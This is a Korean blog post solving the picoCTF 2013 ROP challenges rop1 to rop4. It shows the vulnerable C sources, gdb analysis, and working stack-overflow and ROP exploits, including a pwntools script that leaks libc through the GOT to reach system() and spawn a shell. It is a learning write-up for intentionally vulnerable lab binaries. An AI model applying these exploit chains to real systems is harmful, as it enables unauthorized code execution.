---
layout: post
title: "[study] picoctf 2013 rop series"
date: 2017-06-06 08:00:00
description: "picoctf2013 rop 시리즈 문제 풀이"
category: ctf
tags:  [study, rop]
---

입문 CTF 로서 좋은 문제가 많다고 소문난 **PICO CTF 2013**.
그중 ROP 문제 풀어보자. :)

[write-ups-2013/pico-ctf-2013 at master · ctfs/write-ups-2013](https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013)

<!-- more -->

## rop1

### source

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int not_called() {
    return system("/bin/bash");
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
        be_nice_to_people();
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

### BoF vulnerability

BoF 는 `140` bytes 에서 터짐.

```
gef>  pattern create 400
[+] Generating a pattern of 400 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
[+] Saved as '$_gef0'

0x6261616b in ?? ()
gef>  oaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
Undefined command: "oaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad".  Try "help".
gef>  pattern search 0x6261616b
[+] Searching '0x6261616b'
[+] Found at offset 140 (little-endian search) likely
```

### Analysis

`not_called` 함수 주소는 `0x080484a4`

```
gef➤  disas not_called
Dump of assembler code for function not_called:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x8048610
   0x080484b1 <+13>:    call   0x80483a0 <system@plt>
   0x080484b6 <+18>:    leave
   0x080484b7 <+19>:    ret
```


### Exploit

```bash
$ (python -c 'print "A"*140 + "\xa4\x84\x04\x08"'; cat) |./rop1-fa6168f4d8eba0eb
id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
pwd
/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2013/picoctf/rop1
```



## rop2

### Source

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char * not_used = "/bin/bash";

int not_called() {
    return system("/bin/date");
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
        be_nice_to_people();
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```


### Analysis

NX enabled. ROP 필요.

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```


`not_called()` 함수에서 `system("/bin/date")` 라서 shell 획득 불가.

```c
int not_called() {
    return system("/bin/date");
}
```

### `system()`

```
gdb-peda$ plt
Breakpoint 6 at 0x80483a0 (system@plt)
```

### `/bin/sh` string

```
gdb-peda$ find "/bin/bash"
Searching for '/bin/bash' in: None ranges
Found 3 results, display max 3 items:
rop2-20f65dd0bcbe267d : 0x8048610 ("/bin/bash")
rop2-20f65dd0bcbe267d : 0x8049610 ("/bin/bash")
              [stack] : 0xffffda68 ("/bin/bash")
              ```


### Exploit

system@plt + "/bin/bash" string 

```bash
$ (python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "BBBB" + "\x10\x86\x04\x08"' ;cat ) |./rop2-20f65dd0bcbe267d
id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
pwd
/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2013/picoctf/rop2
```


## rop3

### source 

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function()  {
    char buf[128];
    read(STDIN_FILENO, buf,256);
}

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
        be_nice_to_people();
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

### Analysis

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

`system()` 함수 got/plt 가 없지만 read/write@plt 는 있다.

```
gdb-peda$ plt
Breakpoint 14 at 0x8048380 (__gmon_start__@plt)
Breakpoint 15 at 0x8048390 (__libc_start_main@plt)
Breakpoint 16 at 0x8048370 (getegid@plt)
Breakpoint 17 at 0x8048360 (read@plt)
Breakpoint 18 at 0x80483b0 (setresgid@plt)
Breakpoint 19 at 0x80483a0 (write@plt)
```


```bash
$ nm -D ./libc.so.6 |grep system
0003b060 W system

$ nm -D ./libc.so.6 |grep _libc_start_main
00018180 T __libc_start_main
```


### Exploit

하하하.. 지난번 스터디했던 mem leak을 통한 ASLR 우회 적용하면 될 듯. (write/read@plt 존재.)

```python
from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./rop3-7f3312fe43c46d26")
else:
    conn = remote(HOST, PORT)

elf = ELF("./rop3-7f3312fe43c46d26")

pop3ret = 0x0804855d
__libc_start_main_rel = 0x00018180
system_rel = 0x0003b060

gdb.attach(conn)

ROP = "A" * 140

# write(1, __libc_start_main_got, 4)
ROP += p32(elf.plt['write'])
ROP += p32(pop3ret)
ROP += p32(1)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(4)

# read(0, __libc_start_main_got, 20)
ROP += p32(elf.plt['read'])
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(20)

# system('bin/sh')
ROP += p32(elf.plt['__libc_start_main'])
ROP += p32(0xBBBB)
ROP += p32(elf.got['__libc_start_main']+4)


conn.sendline(ROP)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/bash")
time.sleep(0.1)

conn.interactive()
```


```
$ id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
$ pwd
/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2013/picoctf/rop3
```


## rop4

### Source 

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char exec_string[20];

void exec_the_string() {
    execlp(exec_string, exec_string, NULL);
}

void call_me_with_cafebabe(int cafebabe) {
    if (cafebabe == 0xcafebabe) {
        strcpy(exec_string, "/sh");
    }
}

void call_me_with_two_args(int deadbeef, int cafebabe) {
    if (cafebabe == 0xcafebabe && deadbeef == 0xdeadbeef) {
        strcpy(exec_string, "/bin");
    }
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
    exec_string[0] = '\0';
    be_nice_to_people();
    vulnerable_function();
}
```

### Analysis

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```


### Try #1

함수 형태가 딱 보니.. ROP chaining 하면서 function parameter 맞추어주는 문제 같군.

```
gdb-peda$ pdisas call_me_with_cafebabe
Dump of assembler code for function call_me_with_cafebabe:
   0x08048ef4 <+0>:     push   ebp
   0x08048ef5 <+1>:     mov    ebp,esp
   0x08048ef7 <+3>:     cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x08048efe <+10>:    jne    0x8048f0c <call_me_with_cafebabe+24>
   0x08048f00 <+12>:    mov    eax,0x80c5ec8
   0x08048f05 <+17>:    mov    eax,DWORD PTR [eax]
   0x08048f07 <+19>:    mov    ds:0x80f112c,eax
   0x08048f0c <+24>:    pop    ebp
   0x08048f0d <+25>:    ret   

gdb-peda$ pdisas call_me_with_two_args
Dump of assembler code for function call_me_with_two_args:
   0x08048f0e <+0>:     push   ebp
   0x08048f0f <+1>:     mov    ebp,esp
   0x08048f11 <+3>:     cmp    DWORD PTR [ebp+0xc],0xcafebabe
   0x08048f18 <+10>:    jne    0x8048f39 <call_me_with_two_args+43>
   0x08048f1a <+12>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x08048f21 <+19>:    jne    0x8048f39 <call_me_with_two_args+43>
   0x08048f23 <+21>:    mov    eax,0x80c5ecc
   0x08048f28 <+26>:    mov    edx,DWORD PTR [eax]
   0x08048f2a <+28>:    mov    DWORD PTR ds:0x80f112c,edx
   0x08048f30 <+34>:    movzx  eax,BYTE PTR [eax+0x4]
   0x08048f34 <+38>:    mov    ds:0x80f1130,al
   0x08048f39 <+43>:    pop    ebp
   0x08048f3a <+44>:    ret 
```


### Try #2 

문제는 마지막에 `/bin/sh` string 을 만들어 주어야 하니깐 got 를 조작해서 `strcpy` 를 `strcat` 으로 변조후 호출하는 걸로...

```
gdb-peda$ p strcpy
$1 = {<text gnu-indirect-function variable, no debug info>} 0x806e070 <strcpy>
gdb-peda$ x/10i 0x806e070
   0x806e070 <strcpy>:  cmp    DWORD PTR ds:0x80f1260,0x0
   0x806e077 <strcpy+7>:        jne    0x806e07e <strcpy+14>
```

```
gdb-peda$ p read
$3 = {<text variable, no debug info>} 0x8053d20 <read>
```



그런데, `strcat` 이 없네 ?

### Try #3

그냥 `execlp("/bin/sh", "/bin/sh", NULL)` 로 바로 호출하면 되지 않을까 ?


```
pwndbg> 
$2 = {<text variable, no debug info>} 0x8053ab0 <execlp>

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
rop4 : 0x80cbf4f ("/bin/sh")
gdb-peda$ p execlp
$3 = {<text variable, no debug info>} 0x8053ab0 <execlp>
```


### Exploit

```python
from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./rop4")
else:
    conn = remote(HOST, PORT)

elf = ELF("./rop4")

execlp = 0x8053ab0
binsh_string = 0x80cbf4f

gdb.attach(conn)

ROP = "A" * 140

# execlp("/bin/sh", "/bin/sh", NULL)
ROP += p32(execlp)
ROP += p32(0xBBBB)
ROP += p32(binsh_string)
ROP += p32(binsh_string)
ROP += p32(0x0)


conn.sendline(ROP)
time.sleep(0.1)

conn.interactive()
```



### Execution

```bash
$ python solv.py
[+] Starting local process './rop4': pid 18847
[*] '/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2013/picoctf/rop4/rop4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] running in new terminal: /usr/bin/gdb -q  "/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2013/picoctf/rop4/rop4" 18847
[+] Waiting for debugger: Done
[*] Switching to interactive mode

$ id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)

$ pwd
/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2013/picoctf/rop4
```


